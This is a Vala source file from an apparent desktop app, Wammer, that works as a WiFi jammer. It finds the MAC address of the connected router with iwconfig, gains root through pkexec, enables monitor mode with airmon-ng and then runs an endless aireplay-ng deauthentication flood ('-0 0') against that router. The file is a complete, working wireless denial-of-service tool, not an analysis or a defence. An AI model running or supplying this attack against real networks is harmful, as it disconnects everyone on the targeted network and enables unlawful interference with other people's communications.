/*
* Copyright (C) 2020 Ronny Dobra (https://github.com/RonnyDo/Wammer)
*
* This program is free software; you can redistribute it and/or
* modify it under the terms of the GNU General Public
* License as published by the Free Software Foundation; either
* version 2 of the License, or (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* General Public License for more details.
*
* You should have received a copy of the GNU General Public 
* License along with this program; if not, write to the
* Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,
* Boston, MA 02110-1301 USA
*
* Authored by: Ronny Dobra <ronnydobra at arcor dot de>
*/

namespace Wammer.Services {

    using Utils;
    
    public class Jammer {
        public signal void message (string message);
        public signal void state_changed (JammerState state);

        string monitor_interface = "";

        public JammerState state = JammerState.INACTIVE;
        private GLib.Subprocess jammer_subprocess = null; 
        

        /*
         * Start the jammer
         */        
        public void start (string jammer_interface) {
            if (state != JammerState.INACTIVE) {
                message (_("Jammer is busy or already active."));
                warning ("Jammer is busy or already active.");
                return;
            } else {
                set_state (JammerState.STARTING);
                // stage 1: get MAC address of router, connected to jammer interface
                get_mac (jammer_interface);
            }
        }
 

        /*
         * Get MAC address of router connected to given interface
         */
        public void get_mac (string interface_name) {
            string[] cmd = {"iwconfig", interface_name};
            
            SubprocessLauncher launcher = new SubprocessLauncher (SubprocessFlags.STDOUT_PIPE);    
            
            try {
                Subprocess subprocess = launcher.spawnv (cmd);  
                var stdout_stream = subprocess.get_stdout_pipe ();
                
                debug ("execute command: %s", Utils.Utils.cmd_to_string (cmd));
                subprocess.wait_check_async.begin (null, (obj, res) => {
                    // wait for process to successfully exit
                    try {
                        subprocess.wait_check_async.end (res); 
                          
                        // check if the subprocess was successful (exit code "0)                 
                        if (subprocess.get_successful ()) {
                            string stdout_text = "";
                            string stdout_line = "";
                            DataInputStream stdout_datastream = new DataInputStream (stdout_stream);
                            while ((stdout_line = stdout_datastream.read_line (null)) != null) {
                                stdout_text += stdout_line + "\n";
                            }
                            
                            string mac = Utils.Utils.extract_mac (stdout_text);
                                                        
                            if (mac == "") {
                                string m = _("Make sure the WiFi interface '%s' is plugged in and connected to a network.");
                                message (m.printf (interface_name));
                                warning ("Router MAC couldn't determined. Make sure the device is plugged in and the interface is connected to a network.");
                                reset_default ();
                            } else {
                                info ("Stage 1 completed. Router MAC is " + mac + "\n"); 
                                // SUCCESS !!! continue with stage 2: start monitor mode
                                start_monitor_mode (interface_name, mac);
                            }
                        } else {
                            throw new Error.literal (Quark.from_string ("arp process exited abnormally."), 1,  "");                              
                        
                        }
                    } catch (Error e) {
                        message (_("Uppps, something wen't wrong ... Maybe you try it one more time!"));
                        warning ("Exception while determine router MAC address: %s\n", e.message);
                        reset_default ();
                    }        
                });
            } catch (Error e) {
                error ("Couldn't spawn process for getting MAC address of router: %s\n", e.message);
            }
        }


        public void start_monitor_mode (string interface, string mac) {        
            string[] cmd = {"pkexec", "airmon-ng", "start", interface,};

            SubprocessLauncher launcher = new SubprocessLauncher (SubprocessFlags.STDOUT_PIPE); 
            
            try {
                Subprocess subprocess = launcher.spawnv (cmd);  
                InputStream stdout_stream = subprocess.get_stdout_pipe ();                
                
                debug ("execute command: %s", Utils.Utils.cmd_to_string (cmd));
                subprocess.wait_check_async.begin (null, (obj, res) => {
                    // wait for process to successfully exit
                    try {
                        subprocess.wait_check_async.end (res); 
                        
                        // check output for name of created monitor_interface
                        string stdout_text = "";
                        string stdout_line = "";
                        DataInputStream stdout_datastream = new DataInputStream (stdout_stream);
                        
                        while ((stdout_line = stdout_datastream.read_line (null)) != null) {
                            stdout_text += stdout_line + "\n";
                        }
                        string monitor_interface = Utils.Utils.extract_monitor_interface (stdout_text);
                        
                        // it can be happen that airmon-ng return "mon0" created, but actually no interface is there.
                        // Therefore a doublecheck at this point.
                        bool monitor_interface_running = Utils.Utils.monitor_interface_running (monitor_interface);
                        if (monitor_interface_running) {
                            // SUCCESS !!! continie with stage 3
                            info ("Stage 2 completed. Monitor interface is %s\n", monitor_interface);
                            this.monitor_interface = monitor_interface;
                            start_jamming (monitor_interface, mac);
                        } else {  
                            string m = _("Unfortunately the WiFi interface '%s' doesn‘t seem to be supported.\nPlease check %s for more information.");
                            message (m.printf (interface, "<a href=\"https://www.github.com/ronnydo/wammer/\">https://www.github.com/ronnydo/wammer/</a>"));
                            warning ("Monitor interface couldn't be created from interface %s. airmon-ng output was: %s\n", interface, stdout_text);
                            reset_default ();
                        }
                    } catch (Error e) {
                        message (_("Uppps, something wen't wrong ... Maybe you try it one more time!"));
                        warning ("Exception while starting monitor interface on interface '%s'. Error was: %s\n", interface, e.message);
                        reset_default ();
                    }        
                });
            } catch (Error e) {
                error ("ERROR spawning monitor interface creation process: %s\n", e.message);
            }
        }
        
        
 
        private async void start_jamming (string monitor_interface, string router_mac) {
            string[] cmd = {"pkexec", "aireplay-ng", "-a", router_mac, "-0", "0", "--ignore-negative-one", monitor_interface };
            // string[] cmd = {"pkexec", "ping", "google.com" };
            
            // SubprocessLauncher launcher = new SubprocessLauncher (SubprocessFlags.STDOUT_SILENCE | SubprocessFlags.STDERR_SILENCE); 
            SubprocessLauncher launcher = new SubprocessLauncher (SubprocessFlags.STDOUT_PIPE | SubprocessFlags.STDERR_MERGE); 
            
                            
            try {
                jammer_subprocess = launcher.spawnv (cmd);
                
                set_state (JammerState.ACTIVE);
                info ("Jamming process launched!");                  
                
                //InputStream stdout_stream = jammer_subprocess.get_stdout_pipe (); 
                
                debug ("execute command: %s", Utils.Utils.cmd_to_string (cmd));
                jammer_subprocess.wait_check_async.begin (null, (obj, res) => {
                    try {
                        // wait for process to successfully exit     
                        jammer_subprocess.wait_check_async.end (res);
                        
                        // this case "should" never happen, because the aireplay-ng config say "run until CTRL-Z" terminates me 
                        warning ("aireplay-ng's never ending process ended successfully... that shouldn't happen!");
                        reset_default ();
                    } catch (Error e) {
                        if (jammer_subprocess.get_if_signaled()) {
                            // this should be ne usual reason to exit
                            info ("Jammer task got stopped bye term_signal '%s'. Will try to stop monitor interface.", jammer_subprocess.get_term_sig ().to_string ()); 
                        } else {
                            /*
                            // check output for name of created monitor_interface
                            string stdout_text = "";
                            string stdout_line = "";
                            DataInputStream stdout_datastream = new DataInputStream (stdout_stream);
                            while ((stdout_line = stdout_datastream.read_line (null)) != null) {
                                stdout_text += stdout_line + "\n";
                            }
                            message (_("Uppps, something wen't wrong ... Maybe you try it one more time!"));
                            warning ("Exception while running aireplay-ng jammer process. Will try to stop monitor interface. Exit reason was: %s\nairreplay message was: %s", e.message, stdout_text);
                            */
                        }                            
                        reset_default ();
                    } finally {
                        // remove global jammer_subprocess variable, however the result of the process was
                        jammer_subprocess = null;
                    }
                 });                    
            } catch (Error e) {
                error ("Exception while spawning aireplay-ng jamming process. Running monitor interfaces must be stopped manually. Error was: %s", e.message);
            }
        }
                
        
        private void reset_default () {
            set_state (JammerState.STOPPING);
            if (monitor_interface != "") {
                stop_monitor_mode (monitor_interface);
            } else {
                set_state (JammerState.INACTIVE);
            }
        }
                        
        /*
         * Try to stop jammer
         */ 
        public void stop () {
            if (jammer_subprocess == null) {
                info ("Nothing to stop. Jammer process is null.");
            } else { 
                string id = jammer_subprocess.get_identifier ().to_string ();               
               
                string[] cmd = {"pkexec", "kill", id};
                
                var launcher = new SubprocessLauncher (SubprocessFlags.STDOUT_PIPE);
                try {
                    var subprocess = launcher.spawnv (cmd);
                    
                    info ("try to kill jammer process with id %s",id); 
                    
                    debug ("execute command: %s", Utils.Utils.cmd_to_string (cmd));
                    subprocess.wait_check_async.begin (null, (obj, res) => {
                        try {
                            subprocess.wait_check_async.end (res);
                            //jammer_subprocess = null;
                            info ("Kill request for process %s successfully sent.", id);
                        } catch (Error e) {
                            string m = _("Error while stopping jammer process. Try again or kill process manually: 'sudo kill %s'");
                            message (m.printf (id));
                            warning ("Exception while running jammer kill command: %s\n", e.message);
                        } 
                        // killing the jammer process will automatically trigger the monitor mode stop                   
                    });
                    
                } catch (Error e) {
                    warning ("Couldn't spawn kill comamand for jamming process: %s", e.message);
                }                
            }
        }

        private void stop_monitor_mode (string monitor_interface) {
            if (monitor_interface == "") {
                // nothing to stop if monitor_interface is ""
                return;
            }
           
            string[] cmd = {"pkexec", "airmon-ng", "stop", monitor_interface,};

            SubprocessLauncher launcher = new SubprocessLauncher (SubprocessFlags.NONE); 
            
            try {
                Subprocess subprocess = launcher.spawnv (cmd);  
                
                debug ("execute command: %s", Utils.Utils.cmd_to_string (cmd));
                subprocess.wait_check_async.begin (null, (obj, res) => {
                    try {
                        // wait for process to  exit
                        subprocess.wait_check_async.end (res); 
                        
                        // check if the subprocess has terminated            
                        if (subprocess.get_if_exited ()) {
                            if (Utils.Utils.monitor_interface_running (monitor_interface)) {
                                // Actually it doesn't matter if monitor_interface was killed, because on the next run a second one will be create.
                                // But to avoid any troubles, we rise an error which will lead to app termination.
                                throw new Error.literal (Quark.from_string ("Tasked failed."), 1,  "Stopping monitor interface finished, but interface is still active.");                              
                            } else {
                                // Success! Monitor interface stopped
                                info ("Monitor interface '%s' stopped successfully", monitor_interface);
                                set_state (JammerState.INACTIVE);
                            }                            
                        }
                        monitor_interface = "";
                    } catch (Error e) {
                        error ("Exception while stopping monitor interface. Running monitor interfaces must be stopped manually. Error was: %s\n", e.message);                                                
                    }                            
                });
            } catch (Error e) {
                error ("Exception while spawning process to stop monitor interface. Running monitor interfaces must be stopped manually. Error was: %s\n", e.message);                
            }
        }
        
       
       private void set_state (JammerState state) {
           this.state = state;
           state_changed (state);
       }
    }
}
